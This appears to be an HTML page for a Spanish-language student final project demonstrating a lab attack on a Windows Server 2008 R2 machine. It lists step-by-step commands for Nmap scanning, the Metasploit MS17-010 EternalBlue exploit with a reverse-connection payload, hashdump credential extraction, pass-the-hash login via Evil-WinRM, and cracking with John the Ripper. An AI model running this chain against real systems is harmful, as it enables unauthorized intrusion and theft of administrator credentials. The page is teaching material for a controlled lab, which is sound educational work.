@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trabajo final</title>
+    <link rel="stylesheet" href="./asets/style.css">
+    <link rel="icon" href="./asets/www.png" type="x-icon">
+</head>
+
+<body>
+    <header class="head-nav-1" id="home">
+        <div id="hijo">-</div>
+        <nav class="nav-1">
+            <span><a href="index.html#home" class="navs-head">Home</a></span>
+
+            <span><a href="index.html#text-resent" class="navs-head">About</a></span>
+            <span id=><a href="index.html#contact" class="navs-head">Contact</a></span>
+
+            <span><a href="index.html#Pasos" class="navs-head">Pasos</a></span>
+
+        </nav>
+    </header>
+    <div id="resent">
+        <center>
+            <span id="title-resent">
+                <h1 class="title-resent">Grupo "Phantom Hackers"</h1>
+                <p class="title-resent">Un trabajo experimental enfocado en el uso de Metasploit, una de las
+                    herramientas más poderosas y versátiles en el campo de la ciberseguridad. </p>
+                <p class="title-resent">Nuestro enfoque abarca desde la identificación de debilidades hasta la
+                    explotación, brindando una visión completa de los procesos detrás de los ataques y las defensas en
+                    el mundo real.
+
+                </p>
+            </span>
+        </center>
+    </div>
+    <div id="text-resent">
+        <h2>Sobre Nosotros</h2>
+        <p>Somos un grupo de estudiantes conformado por <strong> Roberto Céspedes</strong>, <strong>Luis Ch. </strong>,
+            y <strong>Cristian Cárdenas</strong>. A lo largo de
+            este proyecto, hemos trabajado de manera exhaustiva y con gran dedicación para poder presentarles lo que
+            hemos denominado nuestro trabajo final, titulado <b> "Phantom Hackers".</b> Este proyecto se enfoca en el
+            uso de
+            diversas herramientas de hacking con el objetivo de vulnerar un entorno creado con Metasploit.
+
+            Durante la presentación, exploraremos los siguientes temas clave: comenzaremos con una explicación detallada
+            de qué es <b>Metasploit</b> y cuál es su relevancia en el ámbito de la ciberseguridad. A continuación,
+            justificaremos por qué hemos elegido estas herramientas específicas para llevar a cabo nuestro objetivo.
+            Posteriormente, describiremos paso a paso el proceso que seguimos, desde la planificación hasta la ejecución
+            de las vulnerabilidades. Finalmente, llevaremos a cabo una demostración en vivo del hackeo, donde podrán
+            observar cómo se ponen en práctica todos los conceptos y técnicas que hemos aprendido durante el desarrollo
+            de este trabajo.
+
+            Nuestro objetivo es que, a través de esta demostración, puedan obtener una comprensión clara y precisa del
+            uso de estas herramientas en entornos controlados y la importancia de su aplicación en el ámbito de la
+            ciberseguridad.</p>
+    </div>
+    <main id="main">
+
+        <section id="caspre">
+            <div class="content"><a href="recursos.html" target="_blank"><img class="set" src="./asets/roberto.jpg"
+                        alt="no funciona"></a>
+                <p>Roberto</p>
+            </div>
+            <div class="content"><a href="luis.pdf" target="_blank"><img class="set" src="./asets/luis.jpg"
+                        alt="no funciona"></a>
+                <p>Luis</p>
+            </div>
+            <div class="content"><a href="Cristian.pdf" target="_blank"><img class="set" src="./asets/cristian.jpg"
+                        alt="no funciona"></a>
+                <p>Cristian</p>
+            </div>
+        </section>
+
+        <section id="Pasos">
+            <h2>Pasos de Desarrollo</h2>
+            <ul type="0">
+
+                <h3>1. Escaneo del Objetivo con Nmap</h3>
+                <p class="parraf-secc-pasos">
+                    <b style="color: white;">Comando: <em>nmap -sV -p- &ltIP del objetivo&gt</em></b>
+                    <br>
+                    <br>
+                    Primero, realizamos un escaneo completo de puertos al objetivo utilizando Nmap. Esto nos
+                    permitirá descubrir puertos abiertos y servicios corriendo, además de obtener información
+                    sobre versiones y posibles vulnerabilidades.
+                </p>
+                <img src="./asets/senati-evidencias/1.png" class="im-pasos-pe" alt="">
+                <h3>2. Identificación de Vulnerabilidad</h3>
+                <p class="parraf-secc-pasos">
+                    <b style="color: white;">Identificamos vulnerabilidad en el puerto 445</b>
+                    <br>
+                    <br>
+                    Tras el escaneo de Nmap, observamos que el puerto 445 está abierto. Este puerto está asociado con el
+                    protocolo SMB (Server Message Block) en sistemas Windows, lo que puede ser vulnerable a ciertos
+                    exploits conocidos.
+                </p>
+
+                <img src="./asets/senati-evidencias/2.png" class="im-pasos-pe" alt="">
+                <h3>Uso de Metasploit en Kali</h3>
+                <p class="parraf-secc-pasos">Instalación de Metasploit <em> (en caso de no tenerlo)</em>
+                    <br>
+                    <br>
+                    <b style="color: white;">Comando: apt install metasploit-framework</b> <br>
+                    <br>
+                    Si no tienes Metasploit instalado en tu sistema Kali, utiliza este comando para instalar el
+                    framework.
+                    <br>
+                    <br>
+                    <img src="./asets/senati-evidencias/3.png" class="im-pasos-pe" alt="">
+                    <br>
+                    <b style="color: white;">Abrir Metasploit Console</b>
+                    <br>
+                    <br>
+                    <img src="./asets/senati-evidencias/4.png" class="im-pasos-pe" alt="">
+                    <br>
+                    <b style="color: white;"> Comando: msfconsole</b>
+                    <br>
+                    <br>
+                    Iniciamos la consola de Metasploit donde interactuaremos con los módulos para explotar la
+                    vulnerabilidad.
+
+                    <img src="./asets/senati-evidencias/5.png" class="im-pasos-pe" alt="">
+                </p>
+
+                <h3>4. Búsqueda de Exploit</h3>
+                <p class="parraf-secc-pasos">
+                    <b style="color: white;">Comando: search type:exploit rank:average Windows server 2008 R2</b>
+                    <br>
+                    <br>
+                    En la consola de Metasploit, utilizamos el comando search para buscar el exploit específico que
+                    puede afectar a servidores Windows 2008 R2 a través de SMB. El exploit MS17-010 EternalBlue SMB
+                    Remot es famoso por
+                    atacar esta vulnerabilidad.
+                </p>
+                <img src="./asets/senati-evidencias/6.png" class="im-pasos-pe" alt="">
+                <h3>5. Selección del Exploit</h3>
+                <p class="parraf-secc-pasos">
+                    <b>Comando: use 0</b>
+                    <br>
+                    <br>
+                    Este comando selecciona el primer exploit en la lista de resultados (o el número correspondiente si
+                    es otro), en este caso el MS17-010 EternalBlue SMB Remot.
+                </p>
+                <img src="./asets/senati-evidencias/use0.png" class="im-pasos-pe" alt="">
+                <h3>6. Configuración del Payload</h3>
+                <p class="parraf-secc-pasos">
+                    <b>Comando: set payload</b>
+                    <br>
+                    <br>
+                    Configuramos el payload que permitirá establecer una conexión inversa entre el objetivo y
+                    nuestra máquina atacante.
+                    <br>
+                </p>
+                <img src="./asets/senati-evidencias/7.jpg" class="im-pasos-pe" alt="">
+                <h3>7. Configuración de Opciones</h3>
+                <p class="parraf-secc-pasos">
+                    <br>
+                    <br>
+                    <b>Comando: show options</b>
+                    <br>
+                    <br>
+                    Mostramos las opciones configurables del exploit y del payload. Aquí podemos ver qué parámetros
+                    están requeridos.
+                    Seteamos la IP del objetivo (RHOST)
+                    <br>
+                    <br>
+                    <b>Comando: set RHOST <IP del objetivo> </b><br>
+                    Especificamos la dirección IP de la víctima para dirigir el ataque.
+                    Seteamos el puerto del servicio vulnerable (RPORT)
+                    <br>
+                    <br>
+                    <b>Comando: set RPORT 445</b>
+                    <br>
+                    <br>
+                    Establecemos el puerto 445, ya que es el puerto que utiliza el servicio SMB en el objetivo.
+                    Seteamos la IP del atacante (LHOST)
+                    <br>
+                    <br>
+                    <b>Comando: set LHOST <IP de Kali></b>
+                    <br>
+                    <br>
+                    Configuramos nuestra propia IP (la del atacante) para recibir la conexión inversa.
+                    Seteamos el puerto del atacante (LPORT)
+                    <br>
+                    <br>
+                    <b>Comando: set LPORT 4444</b>
+                    <br>
+                    <br>
+                    Establecemos el puerto que utilizará la conexión inversa desde el objetivo hacia el atacante. Por
+                    defecto, utilizamos el puerto 4444.
+                </p>
+                <img src="./asets/senati-evidencias/8.png" class="im-pasos-pe" alt="">
+                <h3>8. Selección del Exploit</h3>
+                <p class="parraf-secc-pasos">
+                    <b>Comando: exploit o run </b>
+                    <br>
+                    <br>
+                    Finalmente, ejecutamos el exploit configurado. Este comando iniciará el ataque y, si es exitoso,
+                    obtendremos una sesión de Meterpreter en el sistema objetivo.
+                </p>
+                <img src="./asets/senati-evidencias/9.jpg" class="im-pasos-pe" alt="">
+                <h3>9. Obtención de Hashes</h3>
+                <p class="parraf-secc-pasos">
+                    <b>Comando: hashdump</b>
+                    <br>
+                    <br>Una vez dentro del sistema, podemos utilizar el comando hashdump para extraer los hashes de las
+                    contraseñas en el formato LM o NTLM.
+                </p>
+                <img src="./asets/senati-evidencias/10.jpg" class="im-pasos-pe" alt="">
+                <hr>
+                <br>
+                <br>
+                <h2>Uso de Evil-WinRM para Acceso con Hash</h2>
+                <br>
+                <h3>1. Instalación de Evil-WinRM></h3>
+                <p class="parraf-secc-pasos">
+                    <b>Comando: apt install evil-winrm</b>
+                    <br>
+                    <br>
+                    Evil-WinRM es una herramienta que permite establecer sesiones remotas en máquinas Windows a través
+                    de PowerShell. Para instalarlo, ejecutamos este comando.
+                    <br>
+                    <br>
+                    <b>Instalación de dependencias (Ruby y Git)</b>
+                    <br>
+                    <b>Comando: <em>sudo apt install ruby ruby-dev libffi-dev git -y</em></b>
+                    <br>
+                    <br>
+                    Instalamos las dependencias necesarias para Evil-WinRM.
+                    <br>
+                </p>
+                <img src="./asets/senati-evidencias/apt-evil.png" class="im-pasos-pe" alt="">
+
+                <h3>2. Uso de Evil-WinRM</h3>
+                <p class="parraf-secc-pasos">
+                    <b>Comando: evil-winrm</b>
+                    <br>
+                    <br>
+                    Iniciamos Evil-WinRM para comenzar a interactuar con el servidor remoto.
+                    <b>Acceso con el hash LM</b>
+                    <br>
+                    <br>
+                    <b>Comando: <em> evil-winrm -i &ltIP del objetivo&gt -u 'Administrator' -H '&ltHash LM&gt'</em></b>
+                    <br>
+                    <br>
+                    Instalamos las dependencias necesarias para Evil-WinRM.
+                    <br>
+                </p>
+                <img src="./asets/senati-evidencias/11.jpg" class="im-pasos-pe" alt="">
+                </p>
+                <hr>
+
+                <h3>1. Uso de John the ripeer</h3>
+                <p class="parraf-secc-pasos">
+                    En este caso lo ejecutaremos el comando de <b>john the ripper</b> para poder saber la contraseña del usuario Administrador
+                    que guardamos en un archivo que actualmente es un hash.
+                    <br>
+                    <br>
+                    <b>Comando : <em>john --format=NT --wordlist='ruta de tu diccionario sin las comillas' 'nombre de tu
+                            archivo que has creado, el que contiene el hash'</em>
+                    </b>
+                    <br>
+                    <br>
+                </p>
+                <img src="./asets/senati-evidencias/12.jpg" class="im-pasos-pe" alt="">
+                </p>
+                <h3>Demostración</h3>
+                <video src="./asets/Trabajo-final-senati ‐ Hecho con Clipchamp.mp4" controls class="vide"></video>
+                <p>Si no funciona ir a  <a href="https://youtu.be/jvLuJD9SYuw" target="_blank">LINK</a></p>
+           
+        </section>
+        <section id=conctact></section>
+        <div id="links-derecha">
+            <div class="sepat">
+                <a href="./asets/descripcion-comandos.html" target="_blank">
+                    <img src="./asets/desc.png" alt="enlace-hackeo-descripcioncomandos" class="icons-enlace">
+                </a>
+            </div>
+            <div class="sepat">
+                <a href="./asets/learning-download.html" target="_blank">
+                    <img src="./asets/hacke.png" alt="enlace-intentalo-tutambien" class="icons-enlace">
+                </a>
+            </div>
+            <div class="sepat">
+                <a href="./asets/recursos.html" target="_blank">
+                    <img src="./asets/descarga.png" alt="enlace-descarga_las_maquinas" class="icons-enlace">
+                </a>
+
+                 </div>
+        </div>
+    </main>
+</body>
+
+</html>
